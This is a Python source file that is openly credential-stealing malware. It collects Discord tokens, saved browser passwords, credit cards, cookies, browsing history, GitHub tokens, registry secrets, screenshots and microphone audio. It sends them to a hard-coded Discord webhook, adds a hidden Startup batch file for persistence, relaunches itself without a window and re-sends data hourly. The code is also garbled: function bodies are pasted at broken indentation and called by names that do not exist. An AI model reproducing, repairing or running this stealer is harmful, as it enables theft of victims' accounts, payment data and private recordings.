import os
import sys
import json
import base64
import requests
import threading
import time
import shutil
from datetime import datetime
import subprocess
import tempfile

WEBHOOK_URL = "https://discord.com/api/webhooks/1457067740002127885/mANObIOS90vT031WUQB-z67nGM8rlDShtZdxSszsAqkXK27UDWHbmRrBNaNxPzYlvbpU"

def send_to_discord(data):
    try:
        payload = {
            "embeds": [{
                "title": "Data Collection Report",
                "description": "New data collected from target",
                "color": 16711680,
                "timestamp": datetime.now().isoformat(),
                "fields": []
            }]
        }
        for key, value in data.items():
            if isinstance(value, (dict, list)):
                value_str = json.dumps(value, indent=2)[:1000]
            else:
                value_str = str(value)[:1000]
            payload["embeds"][0]["fields"].append({
                "name": key,
                "value": f"```{value_str}```",
                "inline": False
            })
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except:
        pass

def create_persistence():
    try:
        if os.name == "nt":
            startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            bat_path = os.path.join(startup_path, "system_update.bat")
            with open(bat_path, "w") as f:
                f.write(f'@echo off\\npythonw "{sys.argv[0]}"\\n')
            os.system(f'attrib +h "{bat_path}"')
    except:
        pass

def main():
    collected_data = {}
    

    try:
        def get_discord_tokens():
    tokens = []
    discord_paths = [
        os.path.join(os.getenv("APPDATA"), "discord"),
        os.path.join(os.getenv("LOCALAPPDATA"), "Discord"),
        os.path.join(os.getenv("APPDATA"), "discordptb"),
        os.path.join(os.getenv("APPDATA"), "discordcanary")
    ]
    for path in discord_paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                if "Local Storage" in root and "leveldb" in root:
                    for file in files:
                        if file.endswith(".ldb") or file.endswith(".log"):
                            full_path = os.path.join(root, file)
                            try:
                                with open(full_path, "r", encoding="utf-8", errors="ignore") as f:
                                    content = f.read()
                                    import re
                                    token_matches = re.findall(r"[a-zA-Z0-9_-]{23,28}\.[a-zA-Z0-9_-]{6,7}\.[a-zA-Z0-9_-]{27}", content)
                                    tokens.extend(token_matches)
                            except:
                                pass
    return list(set(tokens))
        discord_token_data = discord_token()
        collected_data["Discord Token"] = discord_token_data
    except Exception as e:
        collected_data["Discord Token"] = {"error": str(e)}

    try:
        def get_credit_cards():
    cards = []
    browsers = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware\\Brave-Browser\\User Data")
    }
    for browser, path in browsers.items():
        if os.path.exists(path):
            for profile in os.listdir(path):
                if "Profile" in profile or "Default" in profile:
                    db_path = os.path.join(path, profile, "Web Data")
                    if os.path.exists(db_path):
                        try:
                            import sqlite3
                            import win32crypt
                            shutil.copy2(db_path, "temp_db")
                            conn = sqlite3.connect("temp_db")
                            cursor = conn.cursor()
                            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                            for row in cursor.fetchall():
                                encrypted_card = row[3]
                                try:
                                    decrypted = win32crypt.CryptUnprotectData(encrypted_card, None, None, None, 0)[1]
                                    card_number = decrypted.decode("utf-8")
                                    cards.append({
                                        "name": row[0],
                                        "month": row[1],
                                        "year": row[2],
                                        "number": card_number,
                                        "browser": browser
                                    })
                                except:
                                    pass
                            conn.close()
                            os.remove("temp_db")
                        except:
                            pass
    return cards
        credit_card_data = credit_card()
        collected_data["Credit Card"] = credit_card_data
    except Exception as e:
        collected_data["Credit Card"] = {"error": str(e)}

    try:
        def get_email_data():
    emails = []
    browser_paths = [
        os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data"),
        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data"),
        os.path.join(os.getenv("APPDATA"), "Mozilla\\Firefox")
    ]
    for base_path in browser_paths:
        if os.path.exists(base_path):
            for profile in os.listdir(base_path):
                if "Profile" in profile or "Default" in profile:
                    logins_path = os.path.join(base_path, profile, "Login Data")
                    if os.path.exists(logins_path):
                        try:
                            import sqlite3
                            import win32crypt
                            shutil.copy2(logins_path, "temp_logins")
                            conn = sqlite3.connect("temp_logins")
                            cursor = conn.cursor()
                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                            for row in cursor.fetchall():
                                url = row[0]
                                username = row[1]
                                encrypted_password = row[2]
                                if "@" in username and any(email_provider in url for email_provider in ["gmail", "outlook", "yahoo", "hotmail"]):
                                    try:
                                        decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                                        password = decrypted.decode("utf-8")
                                        emails.append({
                                            "url": url,
                                            "username": username,
                                            "password": password
                                        })
                                    except:
                                        emails.append({
                                            "url": url,
                                            "username": username,
                                            "password": "ENCRYPTED"
                                        })
                            conn.close()
                            os.remove("temp_logins")
                        except:
                            pass
    return emails
        email_data_data = email_data()
        collected_data["Email Data"] = email_data_data
    except Exception as e:
        collected_data["Email Data"] = {"error": str(e)}

    try:
        def get_browser_passwords():
    passwords = []
    browsers = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware\\Brave-Browser\\User Data"),
        "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software\\Opera Stable")
    }
    for browser_name, browser_path in browsers.items():
        if os.path.exists(browser_path):
            for profile in os.listdir(browser_path):
                if "Profile" in profile or "Default" in profile:
                    login_data_path = os.path.join(browser_path, profile, "Login Data")
                    if os.path.exists(login_data_path):
                        try:
                            import sqlite3
                            import win32crypt
                            shutil.copy2(login_data_path, "temp_login_data")
                            conn = sqlite3.connect("temp_login_data")
                            cursor = conn.cursor()
                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                            for row in cursor.fetchall():
                                encrypted_password = row[2]
                                try:
                                    decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                                    password = decrypted.decode("utf-8")
                                    passwords.append({
                                        "browser": browser_name,
                                        "url": row[0],
                                        "username": row[1],
                                        "password": password
                                    })
                                except:
                                    pass
                            conn.close()
                            os.remove("temp_login_data")
                        except:
                            pass
    return passwords
        browser_passwords_data = browser_passwords()
        collected_data["Browser Passwords"] = browser_passwords_data
    except Exception as e:
        collected_data["Browser Passwords"] = {"error": str(e)}

    try:
        def get_app_passwords():
    app_creds = []
    try:
        import winreg
        registry_paths = [
            "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Cache\\Credentials",
            "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
            "Software\\TeamViewer",
            "Software\\AnyDesk",
            "Software\\Google\\Chrome\\NativeMessagingHosts"
        ]
        for path in registry_paths:
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path)
                for i in range(winreg.QueryInfoKey(key)[1]):
                    try:
                        name, value, _ = winreg.EnumValue(key, i)
                        if "pass" in name.lower() or "pwd" in name.lower() or "secret" in name.lower():
                            app_creds.append({
                                "registry_path": path,
                                "key": name,
                                "value": str(value)[:100]
                            })
                    except:
                        continue
                winreg.CloseKey(key)
            except:
                continue
    except:
        pass
    app_paths = [
        os.path.join(os.getenv("APPDATA"), "Telegram Desktop", "tdata"),
        os.path.join(os.getenv("APPDATA"), "discord", "Local Storage"),
        os.path.join(os.getenv("APPDATA"), "Slack", "Local Storage"),
        os.path.join(os.getenv("APPDATA"), "Signal", "Local Storage")
    ]
    for app_path in app_paths:
        if os.path.exists(app_path):
            for root, dirs, files in os.walk(app_path):
                for file in files:
                    if file.endswith(".json") or file.endswith(".ldb"):
                        try:
                            full_path = os.path.join(root, file)
                            with open(full_path, "r", encoding="utf-8", errors="ignore") as f:
                                content = f.read()
                                if "password" in content.lower() or "token" in content.lower():
                                    app_creds.append({
                                        "app": os.path.basename(app_path),
                                        "file": file,
                                        "snippet": content[:200]
                                    })
                        except:
                            pass
    return app_creds
        application_passwords_data = application_passwords()
        collected_data["Application Passwords"] = application_passwords_data
    except Exception as e:
        collected_data["Application Passwords"] = {"error": str(e)}

    try:
        def get_ip_info():
    ip_info = {}
    try:
        import requests
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        ip_info["public_ip"] = response.json()["ip"]
    except:
        ip_info["public_ip"] = "Failed to retrieve"
    try:
        import socket
        hostname = socket.gethostname()
        ip_info["hostname"] = hostname
        ip_info["local_ip"] = socket.gethostbyname(hostname)
    except:
        ip_info["hostname"] = "Unknown"
        ip_info["local_ip"] = "Unknown"
    try:
        import requests
        response = requests.get(f"http://ip-api.com/json/{ip_info['public_ip']}", timeout=5)
        geo_data = response.json()
        if geo_data["status"] == "success":
            ip_info.update({
                "country": geo_data["country"],
                "region": geo_data["regionName"],
                "city": geo_data["city"],
                "isp": geo_data["isp"],
                "lat": geo_data["lat"],
                "lon": geo_data["lon"]
            })
    except:
        pass
    return ip_info
        ip_address_data = ip_address()
        collected_data["IP Address"] = ip_address_data
    except Exception as e:
        collected_data["IP Address"] = {"error": str(e)}

    try:
        def take_screenshot():
    try:
        import pyautogui
        import io
        import base64
        from datetime import datetime
        screenshot = pyautogui.screenshot()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format="PNG")
        img_byte_arr = img_byte_arr.getvalue()
        return {
            "timestamp": datetime.now().isoformat(),
            "screenshot": base64.b64encode(img_byte_arr).decode("utf-8"),
            "resolution": pyautogui.size()
        }
    except:
        return {"error": "Failed to capture screenshot"}
        screenshot_data = screenshot()
        collected_data["Screenshot"] = screenshot_data
    except Exception as e:
        collected_data["Screenshot"] = {"error": str(e)}

    try:
        def get_github_tokens():
    tokens = []
    git_config_paths = [
        os.path.expanduser("~/.git-credentials"),
        os.path.expanduser("~/.config/git/credentials"),
        os.path.join(os.getenv("USERPROFILE"), ".git-credentials")
    ]
    for config_path in git_config_paths:
        if os.path.exists(config_path):
            try:
                with open(config_path, "r") as f:
                    content = f.read()
                    import re
                    matches = re.findall(r"github\\.com[a-zA-Z0-9_-]+:[a-zA-Z0-9_-]+", content)
                    tokens.extend(matches)
            except:
                pass
    env_vars = ["GITHUB_TOKEN", "GH_TOKEN", "GIT_TOKEN"]
    for env_var in env_vars:
        token = os.getenv(env_var)
        if token:
            tokens.append(f"{env_var}: {token}")
    return tokens
        github_token_data = github_token()
        collected_data["GitHub Token"] = github_token_data
    except Exception as e:
        collected_data["GitHub Token"] = {"error": str(e)}

    try:
        def record_audio(duration=10):
    try:
        import sounddevice as sd
        import numpy as np
        import io
        import base64
        import wave
        from datetime import datetime
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype="float32")
        sd.wait()
        buffer = io.BytesIO()
        with wave.open(buffer, "wb") as wf:
            wf.setnchannels(2)
            wf.setsampwidth(2)
            wf.setframerate(fs)
            wf.writeframes((recording * 32767).astype(np.int16).tobytes())
        audio_data = base64.b64encode(buffer.getvalue()).decode("utf-8")
        return {
            "timestamp": datetime.now().isoformat(),
            "duration": duration,
            "audio_data": audio_data[:50000],
            "sample_rate": fs
        }
    except:
        return {"error": "Audio recording failed"}
        audio_recording_data = audio_recording()
        collected_data["Audio Recording"] = audio_recording_data
    except Exception as e:
        collected_data["Audio Recording"] = {"error": str(e)}

    try:
        def record_microphone(duration=10):
    try:
        import pyaudio
        import wave
        import io
        import base64
        from datetime import datetime
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT,
                       channels=CHANNELS,
                       rate=RATE,
                       input=True,
                       frames_per_buffer=CHUNK)
        frames = []
        for _ in range(0, int(RATE / CHUNK * duration)):
            data = stream.read(CHUNK)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        p.terminate()
        buffer = io.BytesIO()
        wf = wave.open(buffer, "wb")
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b"".join(frames))
        wf.close()
        audio_data = base64.b64encode(buffer.getvalue()).decode("utf-8")
        return {
            "timestamp": datetime.now().isoformat(),
            "duration": duration,
            "audio_data": audio_data[:50000],
            "channels": CHANNELS,
            "sample_rate": RATE
        }
    except:
        return {"error": "Microphone recording failed"}
        microphone_recording_data = microphone_recording()
        collected_data["Microphone Recording"] = microphone_recording_data
    except Exception as e:
        collected_data["Microphone Recording"] = {"error": str(e)}

    try:
        def get_cookies():
    cookies = []
    browsers = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data"),
        "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla\\Firefox")
    }
    for browser_name, browser_path in browsers.items():
        if os.path.exists(browser_path):
            for profile in os.listdir(browser_path):
                if "Profile" in profile or "Default" in profile:
                    if browser_name == "Firefox":
                        cookies_path = os.path.join(browser_path, profile, "cookies.sqlite")
                    else:
                        cookies_path = os.path.join(browser_path, profile, "Cookies")
                    if os.path.exists(cookies_path):
                        try:
                            import sqlite3
                            import win32crypt
                            temp_path = "temp_cookies"
                            shutil.copy2(cookies_path, temp_path)
                            conn = sqlite3.connect(temp_path)
                            cursor = conn.cursor()
                            if browser_name == "Firefox":
                                cursor.execute("SELECT host, name, value FROM moz_cookies")
                            else:
                                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                            for row in cursor.fetchall()[:50]:
                                if browser_name == "Firefox":
                                    cookies.append({
                                        "browser": browser_name,
                                        "host": row[0],
                                        "name": row[1],
                                        "value": row[2]
                                    })
                                else:
                                    try:
                                        decrypted = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1]
                                        value = decrypted.decode("utf-8")
                                        cookies.append({
                                            "browser": browser_name,
                                            "host": row[0],
                                            "name": row[1],
                                            "value": value
                                        })
                                    except:
                                        cookies.append({
                                            "browser": browser_name,
                                            "host": row[0],
                                            "name": row[1],
                                            "value": "ENCRYPTED"
                                        })
                            conn.close()
                            os.remove(temp_path)
                        except:
                            pass
    return cookies
        system_cookies_data = system_cookies()
        collected_data["System Cookies"] = system_cookies_data
    except Exception as e:
        collected_data["System Cookies"] = {"error": str(e)}

    try:
        def get_browser_history():
    history = []
    browsers = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft\\Edge\\User Data")
    }
    for browser_name, browser_path in browsers.items():
        if os.path.exists(browser_path):
            for profile in os.listdir(browser_path):
                if "Profile" in profile or "Default" in profile:
                    history_path = os.path.join(browser_path, profile, "History")
                    if os.path.exists(history_path):
                        try:
                            import sqlite3
                            from datetime import datetime, timedelta
                            temp_path = "temp_history"
                            shutil.copy2(history_path, temp_path)
                            conn = sqlite3.connect(temp_path)
                            cursor = conn.cursor()
                            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                            for row in cursor.fetchall():
                                timestamp = datetime(1601, 1, 1) + timedelta(microseconds=row[3])
                                history.append({
                                    "browser": browser_name,
                                    "url": row[0],
                                    "title": row[1],
                                    "visit_count": row[2],
                                    "last_visit": timestamp.isoformat()
                                })
                            conn.close()
                            os.remove(temp_path)
                        except:
                            pass
    return history
        browser_history_data = browser_history()
        collected_data["Browser History"] = browser_history_data
    except Exception as e:
        collected_data["Browser History"] = {"error": str(e)}

    try:
        send_to_discord(collected_data)
    except:
        pass
    
    create_persistence()
    
    while True:
        time.sleep(3600)
        try:
            for module in collected_data:
                try:
                    module_func = globals().get(module.lower().replace(" ", "_").replace("(", "").replace(")", ""))
                    if module_func:
                        new_data = module_func()
                        update_payload = {
                            "embeds": [{
                                "title": f"Updated: {module}",
                                "description": f"New {module} data collected",
                                "color": 65280,
                                "timestamp": datetime.now().isoformat(),
                                "fields": [{
                                    "name": "Data",
                                    "value": f"```{json.dumps(new_data, indent=2)[:1000]}```",
                                    "inline": False
                                }]
                            }]
                        }
                        requests.post(WEBHOOK_URL, json=update_payload, timeout=10)
                except:
                    pass
        except:
            pass

if __name__ == "__main__":
    try:
        if len(sys.argv) > 1 and sys.argv[1] == "--hidden":
            main()
        else:
            subprocess.Popen([sys.executable, sys.argv[0], "--hidden"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        main()
